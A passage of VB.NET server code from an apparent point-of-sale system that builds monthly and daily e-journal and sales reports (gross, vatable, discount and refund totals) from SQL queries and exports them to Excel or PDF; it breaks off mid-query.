            Dim pSourceURL As String = Common.ServerPath & "temp\AuditTrail"
            Dim mFilenameFolder As String
            Dim mFilenameParentFolder As String
            Dim MIN As String

            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization


            mFilenameFolder = Common.ServerPath & "Content\EJournal\" & WebRequest.Instance().OrgID
            mFilenameParentFolder = Common.ServerPath & "Content\EJournal\"

            DateFrom = Common.WebRequest.Data("MonthYear")
            MIN = CStr2(Common.WebRequest.Data("MIN"))

            If Not System.IO.Directory.Exists(mFilenameParentFolder) Then
                System.IO.Directory.CreateDirectory(mFilenameParentFolder)
            End If

            If Not System.IO.Directory.Exists(mFilenameFolder) Then
                System.IO.Directory.CreateDirectory(mFilenameFolder)
            End If

            'get current sales, discount, beginning and ending invoice
            pSql = "Select SUM(SubTotal) TotalSales, SUM(DiscountAmount) TotalDiscount, MIN(TransactionNo) StartingInvoice, MAX(TransactionNo) EndingInvoice " & vbCrLf &
                    " from  TransSalesInvoiceAndRebatesCache where TransactionType = 'Invoice'  " & vbCrLf &
                    "and MONTH(TransactionDate) = " & CDate(DateFrom).Month & vbCrLf &
                    "and YEAR(TransactionDate) = " & CDate(DateFrom).Year & vbCrLf &
                    " AND DeviceID = " & ReadyString(CStr2(Common.WebRequest.Data("DeviceID"))) & vbCrLf &
                    " AND FOWSTID = " & ReadyString(CStr2(Common.WebRequest.Data("LocationID"))) & vbCrLf

            dtSales = Common.WebRequest.ProData.Execute(pSql)

            dtESales.Columns.Add("MIN")
            dtESales.Columns.Add("Date")
            dtESales.Columns.Add("Last Transaction No Issued")
            dtESales.Columns.Add("Vatable Sales")
            dtESales.Columns.Add("Gross Sales")

            dr = dtESales.NewRow
            dr("MIN") = MIN
            dr("Date") = Format(CDate(DateFrom), "MMMM yyyy")
            dr("Last Transaction No Issued") = CStr2(dtSales.Rows(0).Item("EndingInvoice"))
            dr("Vatable Sales") = CDec2(dtSales.Rows(0).Item("TotalSales")) / 1.12
            dr("Gross Sales") = CDec2(dtSales.Rows(0).Item("TotalSales"))

            dtESales.Rows.Add(dr)

            filename = mFilenameFolder & "\ESales_" & Format(CDate(DateFrom), "MMMM_yyyy") & ".xlsx"

            TableToExcelFile(dtESales, "", "", filename, True)

            Dim pOut As JsonDictionary

            pOut = New JsonDictionary

            pOut.Add("Result", "ESales_" & Format(CDate(DateFrom), "MMMM_yyyy") & ".xlsx")
            pOut.Add("Ejournal", "POS_eJournal_" & MIN & "_" & Format(CDate(DateFrom), "MM-yyy") & ".jrn")

            Return pOut.Serialize

        End Function

        Function DownloadDailyZReadData() As String
            Dim pSql As String
            Dim DateFrom As String
            Dim dtESales As New DataTable
            Dim dtSales As DataTable
            Dim filename As String
            Dim pSourceURL As String = Common.ServerPath & "Content\EJournal\" & WebRequest.Instance().OrgID & "\"
            Dim mFilenameFolder As String
            Dim mFilenameParentFolder As String
            Dim MIN As String

            Dim dtReport As New DataTable
            Dim fowstid As String = CStr2(Common.WebRequest.Data("StoreID"))
            Dim deviceid As String = CStr2(Common.WebRequest.Data("DeviceID"))
            Dim mDate As Date

            Try

                If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

                dtReport.Columns.Add("InvoiceDate")
                dtReport.Columns.Add("GrossSales")
                dtReport.Columns.Add("BegInvoiceNumber")
                dtReport.Columns.Add("EndInvoiceNumber")
                dtReport.Columns.Add("CashAmount")
                dtReport.Columns.Add("SCAmount")
                dtReport.Columns.Add("PWDAmount")
                dtReport.Columns.Add("CreditSales")
                dtReport.Columns.Add("ZeroRated")
                dtReport.Columns.Add("VATExempt")
                dtReport.Columns.Add("VatableSales")
                dtReport.Columns.Add("AccumulatedTotal")


                For Each j As Object In Common.WebRequest.AllData("mData")
                    Dim dr As DataRow

                    dr = dtReport.NewRow
                    dr(0) = j("Date")
                    dr(1) = j("GrossSales")
                    dr(2) = j("BeginningInvoice")
                    dr(3) = j("EndingInvoice")
                    dr(4) = j("CashSales")
                    dr(5) = "0.00"
                    dr(6) = "0.00"
                    dr(7) = j("CreditSales")
                    dr(8) = "0.00"
                    dr(9) = "0.00"
                    dr(10) = Format(CDec2(j("GrossSales")) / 1.12, "#,##0.00")
                    dr(11) = j("GrandTotal")

                    dtReport.Rows.Add(dr)

                    fowstid = j("StoreID")
                    deviceid = j("DeviceID")

                    mDate = CDate(j("Date"))
                Next

                dtReport.DefaultView.Sort = "InvoiceDate"

                TableToExcelFile(dtReport.DefaultView.ToTable, "", "", pSourceURL & mDate.Month & "-" & mDate.Year & "-EJournal.xls")

                Dim pReport = New ProReport
                pReport.SourceFilename = "NagaEJournal"
                Common.WebRequest.ProData.CommandTimeout = 600000
                pReport.AddTable("Data", dtReport.DefaultView.ToTable)

                pSql = " SELECT ISNULL(dev.UuidDisplay, dev.UUID) as SerialNo, " & vbCrLf &
                        " devfow.POSRegistrationNo, " & vbCrLf &
                        " devfow.BIRMachineNo " & vbCrLf &
                        " FROM LibraryDevice as dev " & vbCrLf &
                        " INNER JOIN LibraryDeviceFowst as devfow ON devfow.DeviceID = dev.ID " & vbCrLf &
                        " WHERE dev.ID = " & ReadyString(deviceid) & vbCrLf &
                        " AND devfow.FowstID = " & ReadyString(fowstid) & vbCrLf

                pReport.AddTable("Header", Common.WebRequest.ProData.Execute(pSql))
                pReport.ExportXmlFile()

                Dim path = Common.ServerPath & "temp\" & CreateValidFilename(mDate.Month & "-" & mDate.Year & "-EJournal.pdf", True)
                pReport.ExportFile(ProReport.eExportFormat.Pdf, path)

                Dim file As New System.IO.FileInfo(path)

                Response.Clear()
                Response.AddHeader("Content-Disposition", "attachment; filename=EJournal.pdf")
                Response.AddHeader("Content-Length", file.Length.ToString())
                Response.ContentType = "application/octet-stream"
                Response.WriteFile(file.FullName)
                Response.End()

                'mFilenameFolder = Common.ServerPath & "Content\EJournal\" & WebRequest.Instance().OrgID
                'mFilenameParentFolder = Common.ServerPath & "Content\EJournal\"

                'DateFrom = Common.WebRequest.Data("MonthYear")
                'MIN = CStr2(Common.WebRequest.Data("MIN"))

                'If Not System.IO.Directory.Exists(mFilenameParentFolder) Then
                '    System.IO.Directory.CreateDirectory(mFilenameParentFolder)
                'End If

                'If Not System.IO.Directory.Exists(mFilenameFolder) Then
                '    System.IO.Directory.CreateDirectory(mFilenameFolder)
                'End If

                ''get current sales, discount, beginning and ending invoice
                'pSql = "Select SUM(SubTotal) TotalSales, SUM(DiscountAmount) TotalDiscount, MIN(TransactionNo) StartingInvoice, MAX(TransactionNo) EndingInvoice " & vbCrLf &
                '        " from  TransSalesInvoiceAndRebatesCache where TransactionType = 'Invoice'  " & vbCrLf &
                '        "and MONTH(TransactionDate) = " & CDate(DateFrom).Month & vbCrLf &
                '        "and YEAR(TransactionDate) = " & CDate(DateFrom).Year & vbCrLf &
                '        " AND DeviceID = " & ReadyString(CStr2(Common.WebRequest.Data("DeviceID"))) & vbCrLf &
                '        " AND FOWSTID = " & ReadyString(CStr2(Common.WebRequest.Data("LocationID"))) & vbCrLf

                'dtSales = Common.WebRequest.ProData.Execute(pSql)

                'dtESales.Columns.Add("MIN")
                'dtESales.Columns.Add("Date")
                'dtESales.Columns.Add("Last Transaction No Issued")
                'dtESales.Columns.Add("Vatable Sales")
                'dtESales.Columns.Add("Gross Sales")

                'dr = dtESales.NewRow
                'dr("MIN") = MIN
                'dr("Date") = Format(CDate(DateFrom), "MMMM yyyy")
                'dr("Last Transaction No Issued") = CStr2(dtSales.Rows(0).Item("EndingInvoice"))
                'dr("Vatable Sales") = CDec2(dtSales.Rows(0).Item("TotalSales")) / 1.12
                'dr("Gross Sales") = CDec2(dtSales.Rows(0).Item("TotalSales"))

                'dtESales.Rows.Add(dr)

                'filename = mFilenameFolder & "\ESales_" & Format(CDate(DateFrom), "MMMM_yyyy") & ".xlsx"

                'TableToExcelFile(dtESales, "", "", filename, True)

                'Dim pOut As JsonDictionary

                'pOut = New JsonDictionary

                'pOut.Add("Result", "ESales_" & Format(CDate(DateFrom), "MMMM_yyyy") & ".xlsx")
                'pOut.Add("Ejournal", "POS_eJournal_" & MIN & "_" & Format(CDate(DateFrom), "MM-yyy") & ".jrn")

                'Return pOut.Serialize

            Catch ex As Exception
                AppendToLog(ex.Message)
            End Try
        End Function

        Function DownloadAllEJournalInSelectedDate() As String
            Dim dtDateFrom As DateTime
            Dim dtDateto As DateTime
            Dim dtAuditTrail2 As DataTable
            Dim strReturn As String
            Dim clsSalesReport As New ReportPOS
            Dim dtZRead As DataTable
            Dim FOWSTID As String
            Dim DeviceID As String
            Dim MIN As String

            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            For Each line As String In System.IO.File.ReadLines(Common.ServerPath & "temp\StoreListForEJournal.txt")
                'Code here to read each line

                Dim journalmonth As Integer = 1
                Dim pSql As String
                Dim dtDeviceInformation As DataTable

                pSql = "Select top 1 FOWSTID, DeviceID, POSRegistrationNo from LibraryDeviceFowst " & vbCrLf &
                        "inner join librarydevice on librarydevice.ID = LibraryDeviceFowst.DeviceID " & vbCrLf &
                        "where fowstid IN( " & vbCrLf &
                        "Select top 1 ID from Mobizlibraryorganizationfowst where Code=" & ReadyString(line) & vbCrLf &
                        ") and librarydevice.IsActive = 1 and POSLastORNo>0 and LEN(BIRMachineNo)>10 AND LibraryDeviceFowst.DeviceID <> '3e05b5ea-c792-4e01-8608-e7307f413e7d' " 'device id sa device ni ma'am sweetlee

                dtDeviceInformation = Common.WebRequest.ProData.Execute(pSql)

                AppendToLog(pSql)

                If dtDeviceInformation.Rows.Count > 0 Then

                    FOWSTID = CStr2(dtDeviceInformation.Rows(0).Item("FOWSTID"))
                    DeviceID = CStr2(dtDeviceInformation.Rows(0).Item("DeviceID"))

                    MIN = CStr2(dtDeviceInformation.Rows(0).Item("POSRegistrationNo"))

                    While journalmonth <= 2

                        If journalmonth = 1 Then
                            dtDateFrom = Convert.ToDateTime("2025-06-01")
                            dtDateto = Convert.ToDateTime("2025-06-30")
                        Else
                            dtDateFrom = Convert.ToDateTime("2025-07-01")
                            dtDateto = Convert.ToDateTime("2025-07-31")
                        End If

                        DownloadNagaEJournal(FOWSTID, DeviceID, dtDateFrom, dtDateto, "xlsx")

                        journalmonth += 1
                    End While
                End If

            Next line

            Return strReturn
        End Function

        Function DownloadNagaEJournal(Optional fowstid As String = "", Optional deviceid As String = "", Optional datefrom As String = "", Optional dateto As String = "", Optional fileformat As String = "")

            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Try

                'Dim fowstid As String = Request.Params.Get("FOWSTID")
                'Dim deviceid As String = Request.Params.Get("DeviceID")
                'Dim datefrom As String = CDate(Request.Params.Get("From")).ToString("MM-dd-yyyy")
                'Dim dateto As String = CDate(Request.Params.Get("To")).ToString("MM-dd-yyyy")
                Dim ForceNONVAT As String = False 'Request.Params.Get("ForceNONVAT")
                'Dim fileformat As String = Request.Params.Get("Format")
                Dim filepath As String
                Dim mFilenameFolder = Common.ServerPath & "temp\EJournal\" & WebRequest.Instance().OrgID


                If Not System.IO.Directory.Exists(mFilenameFolder) Then
                    System.IO.Directory.CreateDirectory(mFilenameFolder)
                End If

                Dim pReport = New ProReport
                pReport.SourceFilename = "NagaEJournal"
                Common.WebRequest.ProData.CommandTimeout = 600000

                Dim pSql As String

                pSql = " SELECT ISNULL(dev.UuidDisplay, dev.UUID) as SerialNo, " & vbCrLf &
                        " devfow.POSRegistrationNo, " & vbCrLf &
                        " devfow.BIRMachineNo, " & vbCrLf &
                        " ISNULL(Code, '') + ' ' + ISNULL(Name, '') as StoreName, " & vbCrLf &
                        IIf(ForceNONVAT, "CONVERT(bit, 'False')", "ISNULL(fowst.IsVAT, CONVERT(bit, 'True'))") & " as IsVAT " & vbCrLf &
                        " FROM LibraryDevice as dev " & vbCrLf &
                        " INNER JOIN LibraryDeviceFowst as devfow ON devfow.DeviceID = dev.ID " & vbCrLf &
                        " INNER JOIN MobizLibraryOrganizationFOWST as fowst ON devfow.FowstID = fowst.ID " & vbCrLf &
                        " WHERE dev.ID = " & ReadyString(deviceid) & vbCrLf &
                        " AND devfow.FowstID = " & ReadyString(fowstid) & vbCrLf
                Dim header As DataTable = Common.WebRequest.ProData.Execute(pSql)

                Dim filename As String = header(0)("StoreName") & "_eJournal_" & Format(CDate(datefrom), "MM-dd-yyyy") & "_to_" & Format(CDate(dateto), "MM-dd-yyyy") & "." & fileformat
                filepath = Common.ServerPath & "temp\EJournal\" & CStr(WebRequest.Instance.OrgID) & "\" & filename

                pReport.AddTable("Header", header)

                pSql = "SELECT DISTINCT CONVERT(date, inv.InvoiceDate) as InvoiceDate" & vbCrLf &
                    ", ISNULL((SELECT SUM(invitem.GrossSalesNetOfVATExemptions)" & vbCrLf &
                    "FROM TransInvoiceItems invitem" & vbCrLf &
                    "INNER JOIN TransInvoice sub_inv ON (invitem.InvoiceID = sub_inv.ID)" & vbCrLf &
                    "WHERE sub_inv.InvoiceNumber > 0" & vbCrLf &
                    "AND CONVERT(date, sub_inv.InvoiceDate) = CONVERT(date, inv.InvoiceDate)" & vbCrLf &
                    "AND sub_inv.FOWSTID = inv.FOWSTID" & vbCrLf &
                    "AND sub_inv.DeviceID = inv.DeviceID)" & vbCrLf &
                    ",0) as GrossSales" & vbCrLf &
                    ", ISNULL((SELECT TOP 1 MIN(inv.InvoiceNumber)" & vbCrLf &
                    "FROM TransInvoice sub_inv" & vbCrLf &
                    "WHERE sub_inv.InvoiceNumber > 0" & vbCrLf &
                    "AND CONVERT(date, sub_inv.InvoiceDate) = CONVERT(date, inv.InvoiceDate)" & vbCrLf &
                    "AND sub_inv.FOWSTID = inv.FOWSTID" & vbCrLf &
                    "AND sub_inv.DeviceID = inv.DeviceID)" & vbCrLf &
                    ",0) as BegInvoiceNumber" & vbCrLf &
                    ", ISNULL((SELECT TOP 1 MAX(inv.InvoiceNumber)" & vbCrLf &
                    "FROM TransInvoice sub_inv" & vbCrLf &
                    "WHERE sub_inv.InvoiceNumber > 0" & vbCrLf &
                    "AND CONVERT(date, sub_inv.InvoiceDate) = CONVERT(date, inv.InvoiceDate)" & vbCrLf &
                    "AND sub_inv.FOWSTID = inv.FOWSTID" & vbCrLf &
                    "AND sub_inv.DeviceID = inv.DeviceID)" & vbCrLf &
                    ",0) as EndInvoiceNumber" & vbCrLf &
                    ", ISNULL((SELECT SUM(ISNULL(custpay.OtherTypeAmount,0))" & vbCrLf &
                    "FROM TransCustomerPaymentInvoices custpayinv" & vbCrLf &
                    "INNER JOIN TransCustomerPayment custpay ON (custpayinv.CustomerPaymentID = custpay.ID)" & vbCrLf &
                    "INNER JOIN TransInvoice sub_inv ON (custpayinv.InvoiceID = sub_inv.ID)" & vbCrLf &
                    "WHERE sub_inv.InvoiceNumber > 0" & vbCrLf &
                    "AND CONVERT(date, sub_inv.InvoiceDate) = CONVERT(date, inv.InvoiceDate)" & vbCrLf &
                    "AND sub_inv.FOWSTID = inv.FOWSTID" & vbCrLf &
                    "AND sub_inv.DeviceID = inv.DeviceID)" & vbCrLf &
                    ",0) +" & vbCrLf &
                    "ISNULL((SELECT SUM(ISNULL(custpay.CashAmount,0) - ISNULL(custpay.CustomerChangeCash,0))" & vbCrLf &
                    "FROM TransCustomerPaymentInvoices custpayinv" & vbCrLf &
                    "INNER JOIN TransCustomerPayment custpay ON (custpayinv.CustomerPaymentID = custpay.ID)" & vbCrLf &
                    "INNER JOIN TransInvoice sub_inv ON (custpayinv.InvoiceID = sub_inv.ID)" & vbCrLf &
                    "WHERE CONVERT(date, sub_inv.InvoiceDate) = CONVERT(date, inv.InvoiceDate)" & vbCrLf &
                    "AND sub_inv.FOWSTID = inv.FOWSTID" & vbCrLf &
                    "AND sub_inv.DeviceID = inv.DeviceID)" & vbCrLf &
                    ",0) as CashAmount" & vbCrLf &
                    " , ISNULL((SELECT DISTINCT SUM(custpay.DiscountAmount) " & vbCrLf &
                    " FROM TransCustomerPaymentInvoices custpayinv " & vbCrLf &
                    " INNER JOIN TransCustomerPayment custpay ON (custpayinv.CustomerPaymentID = custpay.ID) " & vbCrLf &
                    " INNER JOIN TransInvoice sub_inv ON (custpayinv.InvoiceID = sub_inv.ID) " & vbCrLf &
                    " INNER JOIN TransInvoiceDiscount as disc ON disc.InvoiceID = sub_inv.ID " & vbCrLf &
                    " LEFT JOIN LibraryDiscountSettings as libdisc ON libdisc.ID = disc.DiscountTypeID " & vbCrLf &
                    " WHERE sub_inv.InvoiceNumber > 0  AND custpay.ReceiptType <> 'RF' AND CONVERT(date, sub_inv.InvoiceDate)  = CONVERT(date, inv.InvoiceDate) " & vbCrLf &
                    " AND sub_inv.FOWSTID = inv.FOWSTID " & vbCrLf &
                    " AND sub_inv.DeviceID = inv.DeviceID " & vbCrLf &
                    " AND libdisc.ID = '055a0a33-dd98-47ec-add3-8b2009f3944a' " & vbCrLf &
                    " GROUP BY disc.DiscountTypeID, libdisc.DiscountType) " & vbCrLf &
                    " ,0) as SCAmount " & vbCrLf &
                    " , ISNULL((SELECT DISTINCT SUM(custpay.DiscountAmount) " & vbCrLf &
                    " FROM TransCustomerPaymentInvoices custpayinv " & vbCrLf &
                    " INNER JOIN TransCustomerPayment custpay ON (custpayinv.CustomerPaymentID = custpay.ID) " & vbCrLf &
                    " INNER JOIN TransInvoice sub_inv ON (custpayinv.InvoiceID = sub_inv.ID) " & vbCrLf &
                    " INNER JOIN TransInvoiceDiscount as disc ON disc.InvoiceID = sub_inv.ID " & vbCrLf &
                    " LEFT JOIN LibraryDiscountSettings as libdisc ON libdisc.ID = disc.DiscountTypeID " & vbCrLf &
                    " WHERE sub_inv.InvoiceNumber > 0  AND custpay.ReceiptType <> 'RF' AND CONVERT(date, sub_inv.InvoiceDate)  = CONVERT(date, inv.InvoiceDate) " & vbCrLf &
                    " AND sub_inv.FOWSTID = inv.FOWSTID " & vbCrLf &
                    " AND sub_inv.DeviceID = inv.DeviceID " & vbCrLf &
                    " AND libdisc.ID = '34a4032f-a142-4c15-a868-4ac4410434df' " & vbCrLf &
                    " GROUP BY disc.DiscountTypeID, libdisc.DiscountType) " & vbCrLf &
                    " ,0) as PWDAmount " & vbCrLf &
                    " , ISNULL((SELECT DISTINCT SUM(custpay.DiscountAmount) " & vbCrLf &
                    " FROM TransCustomerPaymentInvoices custpayinv " & vbCrLf &
                    " INNER JOIN TransCustomerPayment custpay ON (custpayinv.CustomerPaymentID = custpay.ID) " & vbCrLf &
                    " INNER JOIN TransInvoice sub_inv ON (custpayinv.InvoiceID = sub_inv.ID) " & vbCrLf &
                    " INNER JOIN TransInvoiceDiscount as disc ON disc.InvoiceID = sub_inv.ID " & vbCrLf &
                    " LEFT JOIN LibraryDiscountSettings as libdisc ON libdisc.ID = disc.DiscountTypeID " & vbCrLf &
                    " WHERE sub_inv.InvoiceNumber > 0  AND custpay.ReceiptType <> 'RF' AND CONVERT(date, sub_inv.InvoiceDate)  = CONVERT(date, inv.InvoiceDate) " & vbCrLf &
                    " AND sub_inv.FOWSTID = inv.FOWSTID " & vbCrLf &
                    " AND sub_inv.DeviceID = inv.DeviceID " & vbCrLf &
                    " AND libdisc.ID NOT IN ('055a0a33-dd98-47ec-add3-8b2009f3944a', '34a4032f-a142-4c15-a868-4ac4410434df') -- SC,PWD " & vbCrLf &
                    " GROUP BY disc.DiscountTypeID, libdisc.DiscountType) " & vbCrLf &
                    " ,0) as OtherDiscountAmount " & vbCrLf &
                    " , 0 as CreditSales -- TO DO - 0 by default para maka generate lang og report si PC, since walay credit sales si PC " & vbCrLf &
                    " , 0 as ZeroRated " & vbCrLf &
                    " , ISNULL((SELECT SUM(sub_inv.VATExempt - sub_inv.SCDiscount) " & vbCrLf &
                    " FROM TransCustomerPaymentInvoices custpayinv " & vbCrLf &
                    " INNER JOIN TransCustomerPayment custpay ON (custpayinv.CustomerPaymentID = custpay.ID) " & vbCrLf &
                    " INNER JOIN TransInvoice sub_inv ON (custpayinv.InvoiceID = sub_inv.ID) " & vbCrLf &
                    " WHERE sub_inv.InvoiceNumber > 0  AND custpay.ReceiptType <> 'RF' AND CONVERT(date, sub_inv.InvoiceDate)  = CONVERT(date, inv.InvoiceDate) " & vbCrLf &
                    " AND sub_inv.FOWSTID = inv.FOWSTID " & vbCrLf &
                    " AND sub_inv.DeviceID = inv.DeviceID) " & vbCrLf &
                    " ,0) as VATExempt " & vbCrLf &
                    " , ISNULL((SELECT SUM(sub_inv.Vatable) " & vbCrLf &
                    " FROM TransCustomerPaymentInvoices custpayinv " & vbCrLf &
                    " INNER JOIN TransCustomerPayment custpay ON (custpayinv.CustomerPaymentID = custpay.ID) " & vbCrLf &
                    " INNER JOIN TransInvoice sub_inv ON (custpayinv.InvoiceID = sub_inv.ID) " & vbCrLf &
                    " WHERE sub_inv.InvoiceNumber > 0  AND custpay.ReceiptType <> 'RF' AND sub_inv.ForegoneVAT>0 " & vbCrLf &
                    " AND CONVERT(date, sub_inv.InvoiceDate)  = CONVERT(date, inv.InvoiceDate) " & vbCrLf &
                    " AND sub_inv.FOWSTID = inv.FOWSTID " & vbCrLf &
                    " AND sub_inv.DeviceID = inv.DeviceID) " & vbCrLf &
                    " ,0) + " & vbCrLf &
                    " ISNULL((SELECT SUM(ISNULL(invitem.TaxSales,0)- ISNULL(invitem.DiscountSales,0)) " & vbCrLf &
                    " FROM TransInvoice sub_inv " & vbCrLf &
                    " INNER JOIN TransInvoiceItems invitem ON (invitem.InvoiceID = sub_inv.ID) " & vbCrLf &
                    " WHERE sub_inv.InvoiceNumber > 0  --AND custpay.ReceiptType <> 'RF' " & vbCrLf &
                    " AND (convert(int,sub_inv.SCDiscount)=0 OR sub_inv.SCDiscount IS NULL) " & vbCrLf &
                    " AND CONVERT(date, sub_inv.InvoiceDate)  = CONVERT(date, inv.InvoiceDate) " & vbCrLf &
                    " AND sub_inv.FOWSTID = inv.FOWSTID " & vbCrLf &
                    " AND sub_inv.DeviceID = inv.DeviceID) " & vbCrLf &
                    " ,0) - " & vbCrLf &
                    "ISNULL((SELECT SUM(ISNULL(memosr.TotalAmount,0) - ISNULL(memosr.TaxAmount,0))" & vbCrLf &
                    "FROM TransMemoSalesReturn memosr" & vbCrLf &
                    "INNER JOIN TransMemo memo ON (memosr.MemoID = memo.ID)" & vbCrLf &
                    "WHERE CONVERT(date, memo.LastUpdated) = CONVERT(date, inv.InvoiceDate)" & vbCrLf &
                    "AND memo.FOWSTID = inv.FowstID" & vbCrLf &
                    "AND memo.DeviceID = inv.DeviceID)" & vbCrLf &
                    ",0) as VatableSales" & vbCrLf &
                    ",  (ISNULL((SELECT SUM(invitem.GrossSalesNetOfVATExemptions)" & vbCrLf &
                    " FROM TransInvoiceItems invitem" & vbCrLf &
                    " INNER JOIN TransInvoice sub_inv ON (invitem.InvoiceID = sub_inv.ID)" & vbCrLf &
                    " WHERE sub_inv.InvoiceNumber > 0" & vbCrLf &
                    " AND CONVERT(date, sub_inv.InvoiceDate) < CONVERT(date, inv.InvoiceDate)" & vbCrLf &
                    " AND sub_inv.FOWSTID = inv.FowstID" & vbCrLf &
                    " AND sub_inv.DeviceID = inv.DeviceID)" & vbCrLf &
                    ",0) -" & vbCrLf &
                    "(ISNULL((SELECT SUM(custpay.DiscountAmount)" & vbCrLf &
                    " FROM TransCustomerPaymentInvoices custpayinv" & vbCrLf &
                    " INNER JOIN TransCustomerPayment custpay ON (custpayinv.CustomerPaymentID = custpay.ID)" & vbCrLf &
                    " INNER JOIN TransInvoice sub_inv ON (custpayinv.InvoiceID = sub_inv.ID)" & vbCrLf &
                    " INNER JOIN TransInvoiceDiscount as disc ON disc.InvoiceID = sub_inv.ID" & vbCrLf &
                    " AND disc.DiscountTypeID NOT IN ('055a0a33-dd98-47ec-add3-8b2009f3944a', '34a4032f-a142-4c15-a868-4ac4410434df') -- Senior, PWD" & vbCrLf &
                    " WHERE sub_inv.InvoiceNumber > 0 AND custpay.ReceiptType <> 'RF' AND disc.NoOfSeniorCitizens IS NULL" & vbCrLf &
                    " AND CONVERT(date, sub_inv.InvoiceDate) < CONVERT(date, inv.InvoiceDate)" & vbCrLf &
                    " AND sub_inv.FOWSTID = inv.FowstID" & vbCrLf &
                    " AND sub_inv.DeviceID = inv.DeviceID)" & vbCrLf &
                    ",0) +" & vbCrLf &
                    "ISNULL((SELECT SUM(ISNULL(sub_inv.SCDiscount,0))" & vbCrLf &
                    " FROM TransCustomerPaymentInvoices custpayinv" & vbCrLf &
                    " INNER JOIN TransCustomerPayment custpay ON (custpayinv.CustomerPaymentID = custpay.ID)" & vbCrLf &
                    " INNER JOIN TransInvoice sub_inv ON (custpayinv.InvoiceID = sub_inv.ID)" & vbCrLf &
                    " INNER JOIN TransInvoiceDiscount as disc ON disc.InvoiceID = sub_inv.ID" & vbCrLf &
                    " JOIN LibraryDiscountSettings ON LibraryDiscountSettings.ID = disc.DiscountTypeID" & vbCrLf &
                    " WHERE CONVERT(date, sub_inv.InvoiceDate) < CONVERT(date, inv.InvoiceDate)" & vbCrLf &
                    " AND (LibraryDiscountSettings.DiscountType = 'Senior Citizen Discount'" & vbCrLf &
                    " OR LibraryDiscountSettings.DiscountType = 'Person With Disability Discount')" & vbCrLf &
                    " AND sub_inv.FOWSTID = inv.FowstID" & vbCrLf &
                    " AND sub_inv.DeviceID = inv.DeviceID)" & vbCrLf &
                    ",0)" & vbCrLf &
                    ") -" & vbCrLf &
                    "ISNULL((SELECT SUM(srledger.GrossRefundAmount)" & vbCrLf &
                    " FROM TransSalesReturnLedger srledger" & vbCrLf &
                    " INNER JOIN TransMemo memo ON (srledger.SourceMemoID = memo.ID)" & vbCrLf &
                    " WHERE CONVERT(date, memo.LastUpdated) < CONVERT(date, inv.InvoiceDate)" & vbCrLf &
                    " AND memo.FOWSTID = inv.FowstID" & vbCrLf &
                    " AND memo.DeviceID = inv.DeviceID)" & vbCrLf &
                    ",0) -" & vbCrLf &
                    "ISNULL((SELECT SUM(srledger.GrossSrvAmount)" & vbCrLf &
                    " FROM TransSalesReturnLedger srledger" & vbCrLf &
                    " INNER JOIN TransMemo memo ON (srledger.SourceMemoID = memo.ID)" & vbCrLf &
                    " WHERE CONVERT(date, memo.LastUpdated) < CONVERT(date, inv.InvoiceDate)" & vbCrLf &
                    " AND memo.FOWSTID = inv.FowstID" & vbCrLf &
                    " AND memo.DeviceID = inv.DeviceID)" & vbCrLf &
                    ",0) -" & vbCrLf &
                    "ISNULL((SELECT SUM(sub_inv.ForegoneVAT) FROM TransCustomerPaymentInvoices custpayinv INNER JOIN TransCustomerPayment custpay ON (custpayinv.CustomerPaymentID = custpay.ID) INNER JOIN TransInvoice sub_inv ON (custpayinv.InvoiceID = sub_inv.ID) WHERE sub_inv.InvoiceNumber > 0 AND custpay.ReceiptType <> 'RF' AND CONVERT(date, sub_inv.InvoiceDate) < CONVERT(date, inv.InvoiceDate) AND sub_inv.FOWSTID = inv.FowstID AND sub_inv.DeviceID = inv.DeviceID),0) +" & vbCrLf &
                    "ISNULL((SELECT SUM(ISNULL(custpay.ChargeAmount,0)) FROM TransCustomerPaymentInvoices custpayinv INNER JOIN TransCustomerPayment custpay ON (custpayinv.CustomerPaymentID = custpay.ID) INNER JOIN TransInvoice sub_inv ON (custpayinv.InvoiceID = sub_inv.ID) WHERE CONVERT(date, sub_inv.InvoiceDate) < CONVERT(date, inv.InvoiceDate) AND sub_inv.FOWSTID = inv.FowstID AND sub_inv.DeviceID = inv.DeviceID),0) +" & vbCrLf &
                    "ISNULL((SELECT SUM(ISNULL(srledger.Fees, 0) + ISNULL(srledger.RefundFees, 0)) FROM TransSalesReturnLedger srledger INNER JOIN TransMemo memo ON (srledger.SourceMemoID = memo.ID) WHERE CONVERT(date, memo.LastUpdated) < CONVERT(date, inv.InvoiceDate) AND memo.FOWSTID = inv.FowstID AND memo.DeviceID = inv.DeviceID),0)) +" & vbCrLf &
                    "(ISNULL((SELECT SUM(invitem.GrossSalesNetOfVATExemptions) " & vbCrLf &
                    " FROM TransInvoiceItems invitem " & vbCrLf &
                    " INNER JOIN TransInvoice sub_inv ON (invitem.InvoiceID = sub_inv.ID) " & vbCrLf &
                    " WHERE sub_inv.InvoiceNumber > 0 " & vbCrLf &
                    " AND CONVERT(date, sub_inv.InvoiceDate) = CONVERT(date, inv.InvoiceDate) " & vbCrLf &
                    " AND sub_inv.FOWSTID = inv.FowstID " & vbCrLf &
                    " AND sub_inv.DeviceID = inv.DeviceID) " & vbCrLf &
                    ",0) - " & vbCrLf &
                    " ISNULL(tblDiscount.Sum, 0) - " & vbCrLf &
                    " ISNULL(tblRefund.Sum, 0) - " & vbCrLf &
                    " ISNULL((SELECT SUM(srledger.GrossSrvAmount) " & vbCrLf &
                    " FROM TransSalesReturnLedger srledger " & vbCrLf &
                    " INNER JOIN TransMemo memo ON (srledger.SourceMemoID = memo.ID) " & vbCrLf &
                    " WHERE CONVERT(date, memo.LastUpdated) = CONVERT(date, inv.InvoiceDate) " & vbCrLf &
                    " AND memo.FOWSTID = inv.FowstID " & vbCrLf &
                    " AND memo.DeviceID = inv.DeviceID) " & vbCrLf &
                    ",0) - " & vbCrLf &
                    "ISNULL((SELECT SUM(sub_inv.ForegoneVAT) " & vbCrLf &
                    " FROM TransCustomerPaymentInvoices custpayinv " & vbCrLf &
                    " INNER JOIN TransCustomerPayment custpay ON (custpayinv.CustomerPaymentID = custpay.ID) " & vbCrLf &
                    " INNER JOIN TransInvoice sub_inv ON (custpayinv.InvoiceID = sub_inv.ID) " & vbCrLf &
                    " WHERE sub_inv.InvoiceNumber > 0 " & vbCrLf &
                    " AND custpay.ReceiptType <> 'RF' " & vbCrLf &
